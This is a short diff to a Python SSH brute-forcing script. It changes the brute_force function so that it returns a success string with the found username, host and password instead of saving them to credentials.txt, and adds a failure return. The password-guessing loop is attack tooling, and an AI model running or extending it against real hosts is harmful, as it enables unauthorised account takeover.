@@ -53,8 +53,10 @@ def brute_force(host, port):
         for password in passlist:
             if is_ssh_open(host, username, password, port):
                 # if combo is valid, save it to a file
-                open("credentials.txt", "w").write(f"{username}@{host}:{password}")
+                return f"Successfully logged in with {username}@{host}:{password}"
                 break
+
+    return "Failed to log in."
 
 
 if __name__ == "__main__":
